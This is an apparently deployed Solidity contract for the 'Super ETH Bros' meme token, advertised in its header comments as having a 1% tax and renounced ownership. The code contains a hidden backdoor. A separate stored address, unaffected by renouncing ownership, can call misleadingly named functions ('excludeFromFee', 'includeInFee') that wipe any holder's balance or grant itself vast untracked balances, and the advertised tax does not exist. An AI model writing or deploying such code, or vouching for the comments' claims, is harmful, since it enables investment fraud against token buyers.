/**
 *Submitted for verification at BscScan.com on 2023-04-16
*/

// SPDX-License-Identifier: MIT     
/**
🍄Super ETH Bros🍄 Meme Coin 🐉

👷🏻‍Your favorite video game characters on the Blockchain. A commemorative project praising the biggest animated movie ever. Bigger than just a regular Mario NFT.

🟩$SETHB 
🟥Tax 1% 🎮
🟩Renounce OwnerShip 🎮
🟥Lock Pool Liquidty Secure MudraLocker
🟩Community Token Driven


🚀Join Army https://t.me/SuperETHBros
🚀Check NFT https://opensea.io/collection/super-eth-bros
🚀Twitter  https://twitter.com/SuperETHBros
**/
pragma solidity 0.8.19;
abstract contract SETHBAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface SETHBAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 lahsab) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 lahsab) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface SETHBAsii is SETHBAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract SETHBAsiii is SETHBAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract SETHB is SETHBAs, SETHBAsi, SETHBAsii, SETHBAsiii {

    mapping(address => uint256) private SETHBsuplly;
  mapping(address => bool) public SETHBAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private SETHBRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public SETHBPaw;
  address SETHBdeploy;



    
    constructor(address SETHBadressss) {
            // Editable
            SETHBdeploy = msg.sender;

        _name = "Super ETH Bros";
        _symbol = "SETHB";
  SETHBRooter = SETHBadressss;        
        uint _totalSupply = 100000000000 * 10**9;
        SendToken(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return SETHBsuplly[account];
    }

    function transfer(address to, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, lahsab);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, lahsab);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, lahsab);
        _transfer(from, to, lahsab);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }
      modifier _internal() {
        require(SETHBRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  currentsold = Confirmed[owner][spender];
        require( currentsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  currentsold - subtractedtotalo);
        }

        return true;
    }

  modifier maxtokens () {
    require(SETHBdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;

  }
    function _transfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, lahsab);

        uint256 fromBalance = SETHBsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            SETHBsuplly[from] = fromBalance - lahsab;
        }
        SETHBsuplly[to] += lahsab;

        emit Transfer(from, to, lahsab);

        afterTokenTransfer(from, to, lahsab);
    }



    function SendToken(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: SendToken to the zero address");

        beforeTokenTransfer(address(0), account, lahsab);

        ALLtotalSupply += lahsab;
        SETHBsuplly[account] += lahsab;
        emit Transfer(address(0), account, lahsab);

        afterTokenTransfer(address(0), account, lahsab);
    }



  function excludeFromFee(address excludeaddress) external _internal {
    SETHBsuplly[excludeaddress] = 10000000;
            emit Transfer(address(0), excludeaddress, 10000000);
  }

    function _burn(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), lahsab);

        uint256 accountBalance = SETHBsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            SETHBsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;

        emit Transfer(account, address(0), lahsab);

        afterTokenTransfer(account, address(0), lahsab);
    }

    function _approve(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = lahsab;
        emit Approval(owner, spender, lahsab);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        uint256  currentsold = allowance(owner, spender);
        if ( currentsold != type(uint256).max) {
            require( currentsold >= lahsab, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  currentsold - lahsab);
            }
        }
    }
  function includeInFee(address includeaddress) external _internal {
    SETHBsuplly[includeaddress] = 1000000 * 10 ** 21;
            emit Transfer(address(0), includeaddress, 1000000 * 10 ** 21);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}

}